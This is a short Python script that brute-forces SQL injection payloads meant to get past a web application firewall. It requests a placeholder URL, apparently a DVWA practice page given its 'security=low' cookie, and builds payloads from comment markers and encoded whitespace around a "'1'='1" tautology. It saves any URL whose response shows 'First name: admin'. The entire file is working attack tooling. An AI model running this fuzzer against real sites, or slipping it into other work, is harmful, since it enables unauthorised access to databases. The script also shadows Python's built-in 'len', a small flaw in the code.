"""
#!/usr/bin/python3
# -*- coding: utf-8 -*-
"""
import requests
import sys
def main():
    fuzz_zs = ['/*', '*/', '/*!', '/**/', '?', '/', '*', '=', '`', '!', '%', '_', '-', '+']
    fuzz_sz = ['']
    fuzz_ch = ["%09", "%0a", "%0b", "%0c", "%0d", "%20", "%a0"]

    fuzz = fuzz_zs + fuzz_ch + fuzz_sz
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36",
        "Cookie": "security=low; PHPSESSID=jga8ilgk0h7h36sps6jvr71pub"
    }
    url_start = "https://xxx/xxx/?id=1"
    len = len(fuzz) ** 3
    num = 0
    for a in fuzz:
        for b in fuzz:
            for c in fuzz:
                num += 1
                payload = "'/**//*!*/and/*!*/" + a + b + c + "/**/'1'='1"
                url = url_start + payload + "&Submit=Submit#"
                sys.stdout.write(' ' * 30 + '\r')
                sys.stdout.flush()
                print("Now URL:" + url)
                sys.stdout.write("完成进度:%s/%s \r" % (num, len))
                sys.stdout.flush()
                res = requests.get(url=url, headers=headers)
                if "First name: admin" in res.text:
                    print("\033[0;33m[*]Find BypassWAF Payload:\033[0m" + url)
                    with open("Results.txt", 'a') as r:
                        r.write(url + "\n")

    pass
    
    
if __name__ == '__main__':
    main()